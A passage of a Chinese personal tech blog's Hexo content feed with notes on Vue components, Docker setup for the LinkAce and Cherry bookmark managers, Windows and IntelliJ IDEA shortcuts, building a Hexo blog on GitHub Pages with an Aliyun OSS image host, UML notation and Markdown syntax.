&lt;template&gt;    &lt;h3&gt;单文件组件&lt;/h3&gt;    &lt;button @click="sendHandle"&gt;发送数据&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default {    name: "MyComponent",    methods:{        sendHandle(){            this.$emit("onCustom","数据")        }    }}&lt;/script&gt;&lt;style scoped&gt;h3 {    color: red;}&lt;/style&gt;
&lt;template&gt;  &lt;my-componentVue @onCustom="getData" /&gt;&lt;/template&gt;&lt;script&gt;import MyComponentVue from './components/MyComponent.vue'export default {  name: 'App',  components: {    MyComponentVue  },  methods: {    getData(data) {      console.log(data);    }  }}&lt;/script&gt;
]]></content>
      <categories>
        <category>前端</category>
        <category>Vue3</category>
      </categories>
      <tags>
        <tag>Vue3</tag>
      </tags>
  </entry>
  <entry>
    <title>LinkAce书签管理器</title>
    <url>/20250605/7f395aef.html</url>
    <content><![CDATA[Docker安装LinkAce

磁盘路径准备

# 磁盘数据touch docker-compose.ymlmkdir linkace &amp; cd linkace touch .envmkdir database &amp; mkdir backups &amp; cd database# 数据库配置(sqlite数据库)touch database.sqlitechmod 0766 database.sqlite

.env文件


## LINKACE CONFIGURATION## Basic app configuration# The app key is generated later, please leave it like thatAPP_KEY=base64:QaxDvW3pmdJxmPNITFBJHf82JyUn+rK0AUtQTT1jM5c=## Configuration of the database connection# Set the database driver (mysql, pgsql, sqlsrv, sqlite)DB_CONNECTION=sqlite# Set the database name (MySQL, Postgres,...) or path (SQLite) hereDB_DATABASE=/app/database/database.sqlite


docker-compose.yml文件


services:  linkace:    container_name: linkace    image: linkace/linkace:latest    volumes:      - ./linkace/.env:/app/.env      - ./linkace/database/database.sqlite:/app/database/database.sqlite    environment:      - PORT=8080    ports:      - "8080:8080"    restart: unless-stopped    networks:      - hotsnetworks:  hots:    driver: bridge

]]></content>
      <categories>
        <category>应用推荐</category>
      </categories>
  </entry>
  <entry>
    <title>Cherry书签管理器</title>
    <url>/20250610/b78998f1.html</url>
    <content><![CDATA[官网地址
https://cherry.haishan.me/docs/deploy
https://github.com/sissbruecker/linkding
Docker上安装

参数说明




参数
值




JWT_SECRET
加密因子。用 openssl rand -hex 位数 来生成


ENABLE_PUBLIC_REGISTRATION
是否启用注册，默认为 0


USE_INSECURE_COOKIE
设置 1 为暂时禁用 Secure cookie





JWT_SECRET（必需的）：此字符串将用于签署用户的 PAT（个人访问令牌）。PAT 采用 JWT（JSON Web Token）格式，用于验证和识别 Cherry 用户。您应该将JWT_SECRET保密，以防止他人伪造令牌。
ENABLE_PUBLIC_REGISTRATION ：此值确定是否从外部（您的 Cherry Docker 容器实例）启用注册。将其设置 1 为启用注册。默认情况下，或使用其他值，注册被禁用。您很可能希望在全新部署后启用注册，并在创建用户后立即禁用它。
USE_INSECURE_COOKIE：默认情况下，Cherry 使用仅适用于 HTTPS 的 Secure cookie 。但是，如果您想尝试在本地主机上运行 Cherry，您可以将此环境变量设置 1 为暂时禁用 Secure cookie，否则您可能无法登录。


version: '3'services:  cherry:    image: haishanh/cherry:latest    container_name: cherry    ports:      - 5150:8000    volumes:      - ./cherry:/data    environment:        - USE_INSECURE_COOKIE:1      - JWT_SECRET=some-some-secret-string     restart: unless-stopped

用户操作（容器创建之后创建用户）

# 创建用户docker exec cherry cherry create-user &lt;email&gt; &lt;password&gt;# 更新现有用户密码docker exec cherry cherry update-user-password &lt;email&gt; &lt;newPassword&gt;# 删除用户docker exec cherry cherry delete-user &lt;id&gt; &lt;email&gt;
# 数据目录为1001用户权限（磁盘数据迁移需要使用到）chown 1001 /opt/hots_data/cherry -R
]]></content>
      <categories>
        <category>应用推荐</category>
      </categories>
  </entry>
  <entry>
    <title>Windows快捷键</title>
    <url>/20250604/459f9e41.html</url>
    <content><![CDATA[Windows快捷键
win+r 可执行的命令



命令
说明




mstsc
打开远程连接


services.msc
本地服务设置


calc
计算器


dxdiag
查看系统配置命令


regedit
注册表



Windows系统快捷键记录



说明
快捷键




打开任务管理器
Ctrl+Shift+Esc


取消当前任务
Esc


永久删除所选的项目（删除之后无法从回收站还原）
Shift+delete


在选项卡上向后移动
Ctrl+shiff+tab


在选项上向后移动
Tab


在选项卡上向前移动
Shift+Tab



Windows资源管理器中的快捷键



快捷键
说明




Alt+P
显示预览窗格


Alt+←
切换到前一次打开的文件夹


Alt+→
切换到下一次后打开的文件夹


Alt+↑
打开上层文件夹


Backspace
打开上层文件夹



Windows徽标键相关的快捷键



快捷键
说明




Win
打开或者关闭开始菜单


Win+Pause
显示系统属性对话框


Win+d
显示桌面


Win+m
最小化所有窗口


Win+Shift+m
还原最小化窗口到桌面上


Win+E
打开我的电脑


Win+F
搜索文件或文件夹


Win+L
锁定您的计算机或切换用户


Win+R
打开运行对话框


Win+↓
最小化窗口


Win+↑
最大化当前窗口


Win+←
最大化到窗口左侧的屏幕上


Win+→
最大化到窗口右侧的屏幕上


Win+home
最小化所有窗口，除了当前激活窗口



]]></content>
      <categories>
        <category>Windows系统</category>
        <category>快捷键</category>
      </categories>
      <tags>
        <tag>快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title>2023年问题记录</title>
    <url>/20230223/65e80ab3.html</url>
    <content><![CDATA[response.sendRedirect丢失请求地址的HTTPS协议


问题描述：
response.sendRedirect 默认采用的HTTP协议GET请求，导致在重定向之后，原先的HTTPS请求变为HTTP请求


解决


在响应信息中设置HTTP状态码和location头信息
当状态码为302时，表明资源位置临时发生了改变，需要进行重定向，location头信息标识了资源转向的位置，该地址写相对地址
response.setStatus(302);response.setHeader(HttpHeaders.LOCATION, consultUser.getSession_path() + "/dept_sub_consult/source/notice");


使用转发
request.getRequestDispatcher(consultUser.getSession_path() + "/intermediate/list").forward(request,response);




JUnit测试提示Java.lang.Exception: No runnable methods


问题描述：



解决
@Test导入的包错了，spring-test 需要的Junit是org.junit.Test，但是在@Test有两个包，另一个是org.junit.jupiter.api.Test，


]]></content>
      <categories>
        <category>日常记录</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA快捷键</title>
    <url>/20221026/610bdf07.html</url>
    <content><![CDATA[Editing



快捷键
英文说明
中文说明




Ctrl + Space Ctrl + ,
Basic code completion (the name of any class, method or variable)
基本代码完成（任何类、方法或变量的名称）


Ctrl + Shift + Space
Smart code completion (filters the list of methods and variables by expected type)
智能代码完成（按预期类型筛选方法和变量列表）


Ctrl + Shift + Enter
Complete statement
完整声明


Ctrl + P
Parameter info (within method call arguments)
调用方法时，列出全部参数信息


Ctrl + Q
Quick documentation lookup
光标放在类/方法上，快速显示Java doc 信息


Ctrl +hover
Brief Info
鼠标放到类/方法上，提示基本信息


Ctrl + F1
Show descriptions of error or warning at caret
显示光标处的错误或警告的处理提示信息


Alt + Insert
Generate code… (Getters, Setters, Constructors, hashCode/equals, toString)
弹出可生成代码列表（getter、setter、constructor、hashCode/equals、toString）


Ctrl + O
Override methods
弹出可覆写的方法列表


Ctrl + I
Implement methods
弹出要实现的方法列表


Ctrl + Alt + T
Surround with…(if…else,try…catch, for,  synchronized, etc.)
代码块快选（要放在插入点上的代码结束分号上）


Ctrl + /
Comment/uncomment with line comment
代码行注释


Ctrl + Shift + /
Comment/uncomment with block comment
代码块注释


Ctrl + W
Select successively increasing code blocks
选择连续递增的代码块


Ctrl + Shift + W
Decrease current selection to previous state
取消选择代码块


Alt + Enter
Show intention actions and quick-fixes
展示意图行动快速修复


Ctrl + Alt + L
Reformat code
代码格式化


Ctrl + Alt + O
Optimize imports
优化类的import


Ctrl + Alt + I
Auto-indent line(s)
自动缩进行


Tab / Shift + Tab
Indent/unindent selected lines
缩进/取消缩进选定行


Ctrl+X
Cut current line or selected block to clipboard
将当前行或选定块剪切到剪贴板


Ctrl+C
Copy current line or selected block to clipboard
将当前行或选定块复制到剪贴板


Ctrl+V
Paste from clipboard
粘贴


Ctrl+Shift + V
Paste from recent buffers…
打开剪贴板，选择要粘贴的内容


Ctrl+D
Duplicate current line or selected block
复制并粘贴当前行或选定块


Ctrl+Y
Delete line at caret
删除光标处的行


Ctrl+Shift + J
Smart line join
光标所在行和其下一行，或者选择的代码块，合并到一行


Ctrl+Enter
Smart line split
行拆分


Shift + Enter
Start new line
打开新的一行


Ctrl + Shift + U
Toggle case for word at caret or selected block
在光标所在词语或选定块中切换单词的大小写


Ctrl + Shift + ]/[
Select till code block end/start
选择直到代码块结束/开始


Ctrl + Delete/Backspace
Delete to word end/start
删除至单词结束/开始


Ctrl + NumPad+/-
Expand/collapse code block
展开/折叠代码块


Ctrl + Shift+NumPad+
Expand all
展开所有代码块


Ctrl + Shift+NumPad-
Collapse all
折叠所有代码块


Ctrl + F4
Close active editor tab
关闭当前活动的编辑窗口


Ctrl + F12

当前类内搜索方法






快捷键
英文说明
中文说明




Alt + Q
Context info
上下文信息


Shift + F1
External Doc
外部文件



Usage Search



快捷键
英文说明
中文说明




Alt + F7/Ctrl + F7
Find usages/Find usages in file
查找用法/在文件中查找【参数/方法】使用到的地方


Ctrl + Shift + F7
Highlight usages in file
高亮【参数/方法】使用到的地方


Ctrl + Alt + F7
Show usages
弹出【参数/方法】使用到的列表



Navigation



快捷键
英文说明
中文说明




Alt + Right/Left
Go to next / previous editor tab
左边的编辑框/右边的编辑框


F12
Go back to previous tool window
项目结构中，选中当前文件


Esc
Go to editor (from tool window)
光标回到编辑栏


Shift + Esc
Hide active or last active window
关闭最新打开的工具栏


Ctrl+Shift+F4
Close active run / messages / find / … tab
关闭活动的工具栏


Ctrl+G
Go to line
跳转到指定行


Ctrl+E
Recent files popup
弹框显示最近使用过的文件


Ctrl+Alt + Left/Right
Navigate back / forward
后退/前进


Ctrl+Shift+Backspace
Navigate to last edit location
关闭工具窗口，光标回到最后编辑的文件（类似Esc）


Alt + F1
Select current file or symbol in any view
选择一个视图，显示当前文件或符号（资源管理器、浏览器、结构图等）


Ctrl + B , Ctrl + Click
Go to declaration
跳转到声明或者用例处


Ctrl + Alt + B
Go to implementation(s)
跳转到实现处


Ctrl + Shift + I
Open quick definition lookup
弹框中查看类文件


Ctrl + Shift + B
Go to type declaration
跳转类型声明处


Ctrl + Shift + T

转到测试类


Ctrl + U
Go to super-method / super-class
跳转父方法/父类


Alt + Up/Down
Go to previous / next method
光标转到前/后一个方法


Ctrl + ]/[
Move to code block end/start
光标跳转到代码块的结尾/开头


Ctrl + F12
File structure popup
弹出类结构


Ctrl + H
Type hierarchy
打开类型层次结构


Ctrl + Shift + H
Method hierarchy
打开方法层次结构


Ctrl + Alt + H
Call hierarchy
打开调用层次结构


F2 / Shift + F2
Next/previous highlighted error
下一个/前一个 error


F4
Edit source / View source
编辑/查看文件


Alt + Home
Show navigation bar
显示代码导航栏


F11
Toggle bookmark
加上/去掉书签


Ctrl + F11
Toggle bookmark with mnemonic
添加标记书签


Ctrl + #[0-9]
Go to numbered bookmark
转到编号书签


Shift + F11
Show bookmarks
弹框，列出书签



Search/Replace



快捷键
英文说明
中文说明




Double Shift
Search everywhere
搜索任意文件


Ctrl + F
Find
当前文件查找


F3 / Shift + F3
Find next / Find previous
配合“Ctrl + F” 查找下一个/前一个


Ctrl + R
Replace
当前文件替换


Ctrl + Shift + F
Find in pathqu
全局查找


Ctrl + Shift + R
Replace in path
全局替换


Ctrl + N
Go to class
搜索类


Ctrl + Shift + N
Go to file
搜索文件


Ctrl + Alt + Shift + N
Go to symbol
搜索符号


Ctrl + Shift + A
Find Action
搜索操作



Live Templates



快捷键
英文说明
中文说明




Ctrl + Alt + J
Surround with Live Template



Ctrl + J
Insert Live Template
弹出模板选择需要的代码片段


iter
Iteration according to Java SDK 1.5 style
for (Object o : ) {      }


inst
Checkobjecttype with instanceof and downcast it
if (name instanceof Object) {     Object o = (Object) name;      }


itco
Iterate elements of java.util.Collection
for (Iterator iterator = collection.iterator(); iterator.hasNext(); ) {     Object next =  iterator.next();      }


itit
Iterate elements of java.util.Iterator
while (iterator.hasNext()) {     Object next =  iterator.next();      }


itli
Iterate elements of java.util.List
for (int i = 0; i &lt; list.size(); i++) {     Object o =  list.get(i);


thr
throw new
throw new



Refactoring：重构



快捷键
英文说明
中文说明




F5
Copy
复制文件


F6
Move
移动文件


Alt + Delete
Safe Delete



Shift + F6
Rename
重命名（F12 先选中）


Ctrl + F6
Change Signature
更改签名


Ctrl + Alt + N
Inline



Ctrl + Alt + M
Extract Method
提取代码块为一个method


Ctrl + Alt + V
Extract Variable
提取变量（定义一个新变量，保留当前变量的值）修改前：return name;修改后：String name1 = name; return name1;


Ctrl + Alt + F
Extract Field
提取变量为类的一个字段。


Ctrl + Alt + C
Extract Constant
提取静态变量


Ctrl + Alt + P
Extract Parameter
提取方法入参








Debugging



快捷键
英文说明
中文说明




F7 / F8
Step into / Step over
步入/步出（F5/F6）


Shift + F7 / Shift + F8
Smart step into/Step out



Alt + F9
Run to cursor
跑到下一断点


Alt + F8
Evaluate expression
计算表达式


F9
Resume program
重新开始程序（F11）


Ctrl + F8
Toggle breakpoint
加上/去掉 断点


Ctrl + Shift + F8
View breakpoints
查看断点



Compile and Run



快捷键
英文说明
中文说明




Ctrl + F9
Make project (compile modifed and dependent)
构建项目


Ctrl + Shift + F9
Compile selected file, package or module
重新编译


Alt + Shift + F10/F9
Select configuration and run/and debug
打开run/debug的配置文件


Shift + F10/F9
Run/Debug
Run/Debug 程序


Ctrl + Shift + F10
Run context configuration from editor
从编辑器运行上下文配置


Ctrl + F2

stop 程序



VCS/Local History



快捷键
英文说明
中文说明




Ctrl + K
Commit project to VCS
提交


Ctrl + T
Update from VCS
更新


Alt + Shift + C
View recent changes
打开最近变更内容列表


Alt + BackQuote (`)
VCS Operations Popup
弹出版本控制选项框



General



快捷键
英文说明
中文说明




Alt + #[0-9]
Open corresponding tool window
打开相应的工具窗口


Ctrl + S
Save all
保存


Ctrl + Alt + Y
Synchronize
同步（reload）


Ctrl + Shift + F12
Toggle maximizing editor
最大化/恢复 编辑窗口


Alt + Shift + F
Add to Favorites
添加收藏


Alt + Shift + I
Inspect current file with current profile
使用当前配置文件检查当前文件


Ctrl + BackQuote (`)
Quick switch current scheme
切换IDEA主题模式


Ctrl + Alt + S
Open Settings dialog
打开设置


Ctrl + Alt + Shift + S
Open Project Structure dialog
打开项目结构


Ctrl + Tab
Switch between tabs and tool window
打开切换器（类似于windows的任务栏）



查看当前类的父类（Ctrl+Alt+Shift+u）
下面看这个编辑器怎么以图解的形式，查看这种继承关系。


打开子类工具栏：F4
利用的： 顶部菜单 Navigate --&gt; Type Hierarchy
弹出子类UML图：Ctrl+Alt+u

设置相关快捷键

弹出层显示的记录文件个数（Ctrl + E）

行拷贝（Ctrl+Alt+⬇）
Duplicate Line Or Selection

]]></content>
      <categories>
        <category>IDEA</category>
        <category>快捷键</category>
      </categories>
      <tags>
        <tag>快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title>前端日常问题记录</title>
    <url>/20240929/33f402b5.html</url>
    <content><![CDATA[在SPAN元素上禁用设置属性不会阻止点击事件（jquery）
来源：https://www.jb51.cc/jquery/182333.html
一个SPAN元素，在点击事件上做某事。当我禁用它，使用jQuery：$(“span”).attr(“disabled”，true) 无效
解决方法
尝试这个：
$("span").css("pointer-events","none");
你可以启用这些
$("span").css("pointer-events","auto");]]></content>
      <categories>
        <category>日常记录</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>日常记录</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 搭建博客</title>
    <url>/20221025/b6159bfb.html</url>
    <content><![CDATA[一、Hexo 安装和配置
Hexo安装前准备

在使用hexo命令时，请使用windows自带的命令行，管理员运行



安装前提（Hexo是基于Node.js的服务，因此首先需要下载Node.js, 以及Git，再安装Hexo）
C:\Users\Administrator&gt;git --versionC:\Users\Administrator&gt;node --versionC:\Users\Administrator&gt;hexo -v


安装使用hexo-cil
npm install -g hexo-cli


安装 SCSS 渲染器
# 删除旧版渲染器（如有）npm uninstall hexo-renderer-node-sass hexo-renderer-sass hexo-renderer-dartsass# 安装 Dart Sass 渲染器（推荐）npm install hexo-renderer-dartsass --save# 更新其他依赖npm update


Hexo初始化博客


初始化：安装完毕hexo，此时可以选择一个空文件夹建立博客站点框架。执行下面命令，Hexo 将会在指定文件夹中新建所需要的文件。
$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install
执行后Hexo将会在&lt;folder&gt;文件夹建立站点文件。若 &lt;folder&gt;为空，将在当前文件夹建立站点
此时，指定文件夹将会出现如下文件目录
.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes
其中，有几个文件极为重要：

_config.yml 该文件为网站配置信息，包括网站标题、作者、时间、语言、主题等重要配置和功能。
source/_posts/*.md
source 文件夹为博文的资源文件夹，其中的_posts文件夹储存了markdown文件为网站博文。
themes 文件夹储存了第三方主题。



测试初始化结果
建立博文
$ hexo new "welcome"
此时 /source/_posts 文件夹中建立了 welcome.md 文件。接着运行
$ hexo server
此时命令行提示
INFO  Validating configINFO  Start processingINFO  Hexo is running at http://localhost:4000/ . Press Ctrl+C to stop.
说明网站已成功在本地部署（ http://localhost:4000/），可在命令行执行Crtl+C 停止网站运行。


GithubPage部署


关联GithubPage账号


在github账号下建立名为 &lt;github 用户名&gt;.github.io的仓库（这将是之后的访问网址），可以使用readme.md进行初始化。
设置ssh登录。在命令行中输入$ ssh-keygen -t rsa -C "GitHub注册邮箱"直接三个回车，不需要密码。这时在 C:/Users/&lt;用户名&gt;/.ssh 文件夹下会建立公钥 id_rsa.pub 文件，将其中内容全部复制。打开Github Settings keys页面，点击new SSH key，填写任意 title 和刚才复制的公钥信息，并Add SSH key，
此时打开Git Bash，输入ssh git@github.com，会出现You've successfully authenticated, but GitHub does not provide shell access.




进入博客文件夹，在 _config.yml 文件中修改deploy块的信息
deploy:  type: git  repo: git@github.com:hmxyl/hmxyl.github.io.git  branch: main


在博客文件夹下打开命令行，安装部署到github.io的依赖
$ npm install hexo-deployer-git --save


Hexo发布


本地运行：在端口4000
$ hexo clean &amp;&amp; hexo sINFO  Validating configINFO  Start processingINFO  Hexo is running at http://localhost:4000/ . Press Ctrl+C to stop.


部署整个博客到GitHub
$ hexo clean$ hexo generate$ hexo deploy
或者合并命令
$  hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy
此时主目录下出现.deploy_git文件夹，该文件夹与github仓库中的文件一致，为页面文件。此时访问 Github用户名.github.io 即可打开博客网页。
每次部署完，Github通常需要几分钟更新网站，此时多刷新几次网站即可


二、阿里云OSS开通及配置
参考：阿里云OSS+PicGo-Core搭建图床，配合Typora、Obsidian使用
登录阿里云官网，开通对象存储OSS。 根据需要按需购买对应的资源包即可：（搭建个人图床，购买 40G容量5年（45元）+ 5年 的 100万接口上传次数/年（5元） ）基础配置
创建 Bucket
打开OSS管理控制台Bucket页面，按需创建一个Bucket。

创建Bucket成功

进入新建的Bucket，在文件管理-&gt;上传文件中即可开始上传文件，


点击详情，即可看到上传图片的URL，复制URL到浏览器中访问图片。

配置 AccessKey
1. 创建子用户和AccessKey
鼠标移动到头像上即可看到AccessKey管理，打开管理页面，

推荐使用子账户创建的AccessKey（RAM 访问控制 中创建子账户）


选中刚才创建的子用户，即可创建AccessKey并获取AccessKey Secret。

AccessKey Secret只能查看一次，建议复制到自己本地存储，后面PicGo-Core配置需要使用到


Bucket授权子用户权限 ：进入权限管理页面，

配置子用户权限，按需勾选即可，

至此，图床所需的所有配置已弄完
三、PicGo 安装及图床配置


安装：参考PicGo安装


配置图床



参数
说明




设定keyId
创建RAM用户时的 AccessKey ID


设定KeySecret
创建RAM用户时的 AccessKey Secret


设定储存空间名
新建的Bucket名称


确定存储区域
创建的Bucket详情中查看：地域节点  中的二级域名 oss-cn-城市





测试上传一张图片


四、Typora 中 上传图片配置
配置： 文件-&gt; 偏好设置-&gt;图像

五、插件
永久唯一链接：hexo-abbrlink

Hexo根目录下_config.yml原有的链接地址生成方式 permalink: :year/:month/:day/:title/, 其中title为 front-matter内的title，而非文件的名称。




安装abbrlink插件
npm install hexo-abbrlink --save 
安装后，hexo **会自动（保存文章时、或者hexo g时都可以）**在front-matter中自动加入abbrlink字段。
abbrlink一旦生成，即使修改title，其内容也不会再更改了，除非将abbrlink字段手动删除，然后hexo会重新根据title自动生成



_config.yml 中修改 permalink 并定义 abbrlink
# permalink: :year/:month/:day/:title/permalink: :year:month:day/:abbrlink.html     # 将原来文章的地址修改为这个，并添加如下abbrlinkabbrlink:  alg: crc32      #support crc16(default) and crc32  rep: hex        #support dec(default) and hex  drafts: false   #(true)Process draft,(false)Do not process draft. false(default)   # Generate categories from directory-tree  # depth: the max_depth of directory-tree you want to generate, should &gt; 0  auto_category:     enable: true  #true(default)     depth:        #3(default)     over_write: false   auto_title: false #enable auto title, it can auto fill the title by path  auto_date: true #enable auto date, it can auto fill the date by time today  force: false #enable force mode,in this mode, the plugin will ignore the cache, and calc the abbrlink for every post even it already had abbrlink. This only updates abbrlink rather than other front variables.


六、修改Hexo主题
配置新文件模板
路径：根目录下scaffolds-&gt;post.md。使用hexo new post [title]创建文章的时候，应注意把标题里的空格换为-
---title: {{ title }}date: {{ date }}tags:categories:   - [未分类] summary: ""---



参数
描述
默认值




layout
布局
config.default_layout


title
标题
文章的文件名


date
建立日期
文件建立日期


updated
更新日期
文件更新日期


comments
开启文章的评论功能
true


tags
标签（不适用于分页）



categories
分类（不适用于分页）



permalink
覆盖文章网址



excerpt
Page excerpt in plain text. Use this plugin to format the text



disableNunjucks
Disable rendering of Nunjucks tag {{ }}/{% %} and tag plugins when enabled



lang
Set the language to override auto-detection
Inherited from _config.yml



landscape（默认）

GIT地址

# landscape（默认）git clone https://github.com/hexojs/hexo-theme-landscape.git  themes/landscape

启用主题

修改_config.yml
theme: landscape
七、Hexo主题：NexT（当前）
初始化配置NexT
GIT地址
# nextgit clone https://github.com/theme-next/hexo-theme-next themes/next
启用主题
修改_config.yml
theme: next
选择 Scheme
scheme: Pisces

Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白
Mist - Muse 的紧凑版本，整洁有序的单栏外观
Pisces - 双栏 Scheme

设置菜单：menu


主题配置文件 设定菜单内容：
menu:  home: / || fa fa-home  friendlink: /friendlink/ || fa fa-briefcase  #about: /about/ || fa fa-user  tags: /tags/ || fa fa-tags  categories: /categories/ || fa fa-th  archives: /archives/ || fa fa-archive  #schedule: /schedule/ || fa fa-calendar  #sitemap: /sitemap.xml || fa fa-sitemap  #commonweal: /404/ || fa fa-heartbeat
NexT 默认的菜单



键值
设定值
显示文本（简体中文）





home
home: /
主页



archives
archives: /archives
归档页



categories
categories: /categories
分类页
需要手动创建


tags
tags: /tags
标签页
需要手动创建


about
about: /about
关于页面
需要手动创建


commonweal
commonweal: /404.html
公益 404
需要手动创建



菜单配置包括三个部分，第一是菜单项（名称和链接），第二是菜单项的显示文本，第三是菜单项对应的图标。
NexT 使用的是 Font Awesome 提供的图标。若你的站点运行在子目录中，请将链接前缀的 / 去掉。


设置菜单项的显示文本
在第一步中设置的菜单的名称并不直接用于界面上的展示。Hexo 在生成的时候将使用 这个名称查找对应的语言翻译，并提取显示文本。这些翻译文本放置在 NexT 主题目录下的 languages/{language}.yml （{language} 为你所使用的语言）。
以简体中文为例，若你需要添加一个菜单项，比如 something。那么就需要修改简体中文对应的翻译文件 languages/zh-CN.yml，在 menu 字段下添加一项：
menu:  home: 首页  archives: 归档  categories: 分类  tags: 标签  about: 关于  search: 搜索  commonweal: 公益404  something: 有料


设定菜单项的图标开关：menu_icons
图标配置在“||” 之后。可从主题文件夹source\lib\font-awesome\css\all.min.css中搜索到需要的图标
# 菜单图标配置示例menu_icons:  enable: true  # 將值badge設置為true可以在主題配置文件的menu_settings部分的菜單項中顯示帖子/類別/標籤的計數  badges: false


配置分类：categories


主题配置文件放开 tags: /tags/ || fa fa-tags 这行代码就已经配置好里分类。


创建分类目录文件
$ hexo new page categories


编辑页面让主题识别页面为分类页面
上文说到需要编辑页面才能让主题识别这个页面为分类页面，我们只需要根据成功后到提示路径打开index.md这个页面文件，打开后默认内容是
---title: 文章分类date: 2021-01-25 22:37:25---
我们需要添加上type: "categories"这段代码就能让主题识别该页面为分类页面了
---title: 文章分类date: 2021-01-25 22:37:25type: "categories"---
我们就完成了整个分类页面的配置了


给文章设置分类属性
首先打开需要添加分类的文章，在文章里添加上以下文案就设置好分类了
---categories: - Android---
如上categories:Android表示添加这边文章到 “Android” 这个分类下。
然后我们就可以在博客到分类里看到该分类了。
//设置二级分类---categories: - Android- xxx---
如上设置二级分类则该篇文章为 Android 分类下的 XXX 分类下。


配置标签：tags


主题配置文件放开 tags: /tags/ || fa fa-tags 这行代码就已经配置好里分类。


创建标签目录文件
$ hexo new page tags


编辑页面让主题识别页面为标签页面
上文说到需要编辑页面才能让主题识别这个页面为标签页面，我们只需要根据成功后到提示路径打开index.md这个页面文件，添加上type: "tags"这段代码就能让主题识别该页面为标签页面了
---title: 标签date: 2021-01-25 22:54:58type: "tags"---


给文章设置标签属性
//设置单标签---tags:- Facebook配置---//设置多标签 并同时设置分类---categories: - Androidtags:- Android- RecyclerView---
如上tags:- Facebook配置表示给这篇文章添加 “Facebook配置” 这个分标签。
然后我们就可以在博客到标签里看到该标签了。


设置侧栏：sidebar
默认情况下，侧栏仅在文章页面（拥有目录列表）时才显示，并放置于右侧位置。 可以通过修改 主题配置文件 中的 sidebar 字段来控制侧栏的行为。侧栏的设置包括两个部分，其一是侧栏的位置， 其二是侧栏显示的时机。


设置侧栏的位置，修改 sidebar.position 的值，支持的选项有：

left - 靠左放置
right - 靠右放置

目前仅 Pisces Scheme 支持 position 配置。影响版本5.0.0及更低版本。
sidebar:  position: left


设置侧栏显示的时机，修改 sidebar.display 的值，支持的选项有：

post - 默认行为，在文章页面（拥有目录列表）时显示
always - 在所有页面中都显示
hide - 在所有页面中都隐藏（可以手动展开）
remove - 完全移除

sidebar:  display: post
已知侧栏在 use motion: false 的情况下不会展示。 影响版本5.0.0及更低版本。


设置头像：avatar
编辑 主题配置文件， 修改字段avatar ， 值设置成头像的链接地址。其中，头像的链接地址可以是：



地址
值




完整的互联网 URI
http://example.com/avatar.png


站点内的地址
将头像放置主题目录下的 source/uploads/ （新建 uploads 目录若不存在） 配置为：avatar: /uploads/avatar.png或者 放置在 source/images/ 目录下 配置为：avatar: /images/avatar.png



头像设置示例
avatar: http://example.com/avatar.png
首页只显示部分摘要（不显示全文）
Next默认是会显示全文的，这样显然很不方便，因此需要一些方法去只显示前面一部分。


修改配置
首先需要在Next主题的_config.yml中把设置打开：(默认安装时就打开了)
# Automatically excerpt description in homepage as preamble text.excerpt_summary: true


之后有两种方法


方法一：写概述
在文章的front-matter中添加description，其中description中的内容就会被显示在首页上，其余一律不显示。
---title: 让首页显示部分内容date: 2020-02-23 22:55:10summary: 这是显示在首页的概述，正文内容均会被隐藏。---


方法二：文章截断
在需要截断的地方加入：
&lt;!--more--&gt;
首页就会显示这条以上的所有内容，隐藏接下来的所有内容。
例如本文会显示到修改配置上面。
这个明显就方便很多，但当然有利有弊，比如开头都是废话首页看着就不是很好看，因此我一般会先选择方法二，如果感觉文章前面的写的不太好再用方法一。




修改字体
修改themes\next\source\css\_variables\base.styl 文件
八、问题记录


运行Hexo报错hexo : 无法加载文件hexo.ps1，因为在此系统上禁止运行脚本

解决方案: https://blog.csdn.net/qq_42951560/article/details/123678786
设置-&gt;隐私和安全性-&gt;开发者选项-&gt;允许本地PowerShell脚本在为签名的情况下运行




]]></content>
      <categories>
        <category>博客搭建</category>
        <category>Hexo</category>
      </categories>
  </entry>
  <entry>
    <title>UML类图与接口图的表示</title>
    <url>/20221025/c9ac90bb.html</url>
    <content><![CDATA[类图

①访问修饰符	+ ：public	-： private	# : protected（friendly也归入这类）② + a : int = defaultValue解读	a：成员变量名	int： 变量名的类型	defaultValue： 为a的默认值③ + operation1(int params):returnType解读	operation1： 方法名	params： 方法参数名	reternType： 返回值类型
抽象类图
注意，名称为斜体

接口图

类之间的关系
泛化（继承）关系

实现关系

关联关系
单关联关系

双向关联关系

自关联

聚合关系

组合关系

]]></content>
      <categories>
        <category>博客搭建</category>
        <category>UML类图</category>
      </categories>
  </entry>
  <entry>
    <title>Markdown使用语法记录</title>
    <url>/20221025/ea43daec.html</url>
    <content><![CDATA[目录
开头输入` [TOC]`， 根据标题生成目录
标题
# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题
段落
段落的换行是使用两个以上空格加上回车。
字体
*斜体文本***粗体文本*****粗斜体文本***_斜体文本___粗体文本_____粗斜体文本___
分隔线
三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：**** * ******- - -----------
删除线
~~删除文字~~
高亮
==highlight==
下划线
&lt;u&gt;带下划线文本&lt;/u&gt;
脚注
[^要注明的文本]举例：下面是要标记脚注[^脚注]的测试段落。可以在多个位置使用同一个脚注[^脚注]。脚注[^脚注]内容会自动到页面底部。[^脚注]:脚注说明内容，需要独立一行。下面一行空着。123再次使用同一个脚注[^脚注]
效果：
下面是要标记脚注^脚注的测试段落。可以在多个位置使用同一个脚注^脚注。脚注^脚注内容会自动到页面底部。
1
2
3
再次使用同一个脚注^脚注
无序列表
星号(*)、加号(+)或是减号(-)作为列表标记，标记后面添加一个空格举例：* 第一项* 第二项* 第三项+ 第一项+ 第二项+ 第三项- 第一项- 第二项- 第三项
有序列表
有序列表使用数字并加上 . 号来表示，如：1. 第一项2. 第二项3. 第三项
列表嵌套
